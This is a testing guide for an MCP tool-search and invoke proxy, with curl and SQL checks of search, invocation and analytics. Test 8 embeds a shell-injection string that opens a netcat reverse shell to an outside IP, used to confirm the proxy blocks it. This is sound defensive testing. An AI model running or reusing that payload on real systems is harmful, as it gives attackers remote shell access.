# Testing Guide

Last updated: 2026-04-23

This guide focuses on the MVP core:

1. ingest / canonical registry state
2. search
3. invoke
4. search -> invoke analytics linkage

## Quick Status

Current validation baseline:

- `npx tsc --noEmit`
- `npm test -- --runInBand`

Both should pass before manual testing.

Important:

- the automated test suite in this repo is Jest-based
- use `npm test -- --runInBand`
- do not use `bun test` for this suite unless the tests are rewritten for Bun's mocking API

## Automated Checks

### 1. TypeScript

Run:

```bash
npx tsc --noEmit
```

Expected:

- exit code `0`
- no output

### 2. Jest

Run:

```bash
npm test -- --runInBand
```

Expected:

- 3 test suites passed
- 86 tests passed

### 3. Fast repeat loop

For quick regression testing while editing:

```bash
npx tsc --noEmit
npm test -- --runInBand
```

If both are green, the core runtime path is in much better shape than before.

## Manual Testing

## Prerequisites

You need a working local app environment with:

- Supabase env vars
- service role key
- app URL / auth env vars

Start the app:

```bash
npm run dev
```

Assume local base URL:

```text
http://localhost:3000
```

## Test 1: MCP initialize

Send:

```bash
curl -s http://localhost:3000/api/mcp-server \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"initialize",
    "params":{}
  }'
```

Expected:

- JSON-RPC response
- `protocolVersion` returned
- `instructions` present

## Test 2: MCP tools/list

Send:

```bash
curl -s http://localhost:3000/api/mcp-server \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "id":2,
    "method":"tools/list"
  }'
```

Expected:

- `search_tools`
- `invoke_tool`

## Test 3: MCP search_tools

Send:

```bash
curl -s http://localhost:3000/api/mcp-server \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "id":3,
    "method":"tools/call",
    "params":{
      "name":"search_tools",
      "arguments":{
        "intent":"send a transactional email with html body",
        "limit":5
      }
    }
  }'
```

Expected:

- MCP JSON-RPC success response
- text payload containing:
  - `intent`
  - `intent_hash`
  - `search_event_id`
  - `results`

Important:

- keep the returned `search_event_id`
- keep the original `intent`
- pass both into `invoke_tool`

## Test 4: REST search fallback compatibility

Send:

```bash
curl -s 'http://localhost:3000/api/servers/search?q=email&limit=5'
```

Expected:

- JSON response
- no crash even if DB is on the 2-arg `search_servers(...)` function signature
- each result should include transport/auth guidance

## Test 5: invoke_tool unauthenticated

Send:

```bash
curl -s http://localhost:3000/api/mcp-server \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "id":4,
    "method":"tools/call",
    "params":{
      "name":"invoke_tool",
      "arguments":{
        "server":"sendgrid-mail",
        "tool":"send_email",
        "args":{"to":"user@example.com"}
      }
    }
  }'
```

Expected:

- structured auth failure
- status `401` in the wrapped response

## Test 6: invoke_tool authenticated

First create or use an API key with prefix `sk_mcp_...`.

Then call:

```bash
curl -s http://localhost:3000/api/mcp-server \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer sk_mcp_your_key_here' \
  -d '{
    "jsonrpc":"2.0",
    "id":5,
    "method":"tools/call",
    "params":{
      "name":"invoke_tool",
      "arguments":{
        "server":"sendgrid-mail",
        "tool":"send_email",
        "search_event_id":"<paste from search_tools>",
        "intent":"send a transactional email with html body",
        "args":{
          "to":"user@example.com",
          "subject":"Test",
          "body":"Hello"
        }
      }
    }
  }'
```

Expected:

- successful result, or
- structured upstream auth/setup guidance if that server requires credentials

Most important validation:

- `search_event_id` and `intent` are now accepted by `invoke_tool`
- that means successful invokes can feed `intent_server_mappings`

## Test 7: DLP request blocking

Send:

```bash
curl -s -X POST http://localhost:3000/api/proxy/stripe/charge \
  -H 'Authorization: Bearer sk_mcp_your_key_here' \
  -H 'Content-Type: application/json' \
  -d '{
    "api_key":"sk_live_abcdefghijklmnopqrstuvwxyz0123",
    "amount":4900
  }'
```

Expected:

- `400`
- blocked due to credential leakage in request args

## Test 8: Shell injection blocking

Send:

```bash
curl -s -X POST http://localhost:3000/api/proxy/shell-test/run \
  -H 'Authorization: Bearer sk_mcp_your_key_here' \
  -H 'Content-Type: application/json' \
  -d '{
    "command":"ls; nc -e /bin/bash 10.0.0.1 4444"
  }'
```

Expected:

- `400`
- blocked due to shell injection detection

## Test 9: Search -> Invoke learning path

This is the key MVP validation.

Steps:

1. Run `search_tools`.
2. Save `search_event_id`.
3. Run `invoke_tool` with:
   - `search_event_id`
   - original `intent`
4. Confirm invoke succeeds.
5. Inspect DB:
   - `search_events`
   - `invoke_outcomes`
   - `intent_server_mappings`

Expected:

- a `search_events` row exists for the search
- an `invoke_outcomes` row exists for the invoke
- the outcome row references the search event when provided
- `intent_server_mappings` is updated for successful invokes

## Database Verification Queries

Use SQL in Supabase or your DB client.

### Latest search events

```sql
select id, intent_text, intent_hash, top_server, created_at
from public.search_events
order by created_at desc
limit 10;
```

### Latest invoke outcomes

```sql
select search_event_id, server_name, tool_name, status_code, success, created_at
from public.invoke_outcomes
order by created_at desc
limit 10;
```

### Latest intent mappings

```sql
select intent_text, server_name, tool_name, invoke_count, success_count, failure_count, avg_latency_ms
from public.intent_server_mappings
order by last_invoked_at desc
limit 10;
```

## What To Watch Closely

### Search

- no crash on `/api/servers/search`
- `search_tools` returns `search_event_id`
- `proxy_available` is not guessed optimistically for stdio rows

### Invoke

- unauthenticated invoke returns structured auth guidance
- authenticated invoke accepts `sk_mcp_...`
- DLP and shell blocking happen before upstream execution

### Analytics

- `invoke_tool` receives and forwards `search_event_id`
- `intent` is forwarded and hashed
- successful invokes can update intent mappings

## Recommended Regression Checklist

Run this before shipping:

1. `npx tsc --noEmit`
2. `npm test -- --runInBand`
3. manual `initialize`
4. manual `tools/list`
5. manual `search_tools`
6. manual authenticated `invoke_tool`
7. manual DLP block
8. verify DB rows for `search_events`, `invoke_outcomes`, `intent_server_mappings`

If all of those pass, the core MVP loop is functioning.
